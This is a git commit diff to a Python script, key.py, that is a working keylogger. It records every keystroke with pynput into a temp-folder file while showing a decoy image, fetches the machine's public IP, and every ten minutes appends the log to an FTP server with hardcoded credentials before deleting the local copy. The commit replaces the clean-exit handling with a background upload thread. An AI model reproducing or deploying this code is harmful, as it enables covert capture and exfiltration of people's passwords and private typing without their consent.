868d9ef908a9a279d3d096ee668d814db831201e
Frankom <vasylopozdro@gmail.com>
2025-03-12 20:30:49 +0100

    file create in temp folder and upload to ftp every 10 minutes

--- key.py
+++ key.py
@@ -1,50 +1,49 @@
 from pynput import keyboard
 #from pynput.keyboard import Listener
 from PIL import Image
-import signal
-import sys
 import time
 import ftplib
 import os
 import requests
+import tempfile
+import threading
+
+tempdir = tempfile.gettempdir()
+filename = os.path.join(tempdir, 'file')
 
 def ftpUpload():
     HOSTNAME = "localhost"
     USERNAME = "Frankom"
     PASSWORD = "123"
     IPAddr = requests.get("https://api.ipify.org/?format=json").json()['ip']
-    filename = 'file'+'-'+IPAddr
+    filename2 = os.path.join('file-'+IPAddr)
+    #filename = 'file'+'-'+IPAddr
     ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
-    with open('file', 'rb') as f:
-        ftp_server.storbinary(f"STOR {filename}", f)
+    with open(filename, 'rb') as f:
+        ftp_server.storbinary(f"APPE {filename2}", f)
 
 def on_press(key):
-    with open('file', 'a') as f:
+    with open(filename, 'a') as f:
         f.write(str(key)+' ')
 
 Image.open('urabe.jpg').show()
+
+with open(filename, 'a') as f:
+    f.write('')
 
 #with Listener(on_press=on_press) as listener:
 #    listener.join()
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
-running = True  
+def every10mins():
+    while True:
+        time.sleep(600)
+        ftpUpload()
+        os.remove(filename)
 
-def handle_exit(signum, frame):
-    global running
-    print(f"\nReceived signal {signum}, exiting gracefully...")
-    ftpUpload()
-    os.remove('file')
-    running = False  
-    listener.stop()  
-    sys.exit(0)
+thread = threading.Thread(target=every10mins, daemon=True)
+thread.start()
 
-signal.signal(signal.SIGINT, handle_exit)   # Ctrl+C
-signal.signal(signal.SIGTERM, handle_exit)  # kill <pid>
-
-while running:
-    try:
-        time.sleep(0.1) 
-    except KeyboardInterrupt:
-        handle_exit(signal.SIGINT, None)
+while True:
+    time.sleep(1)
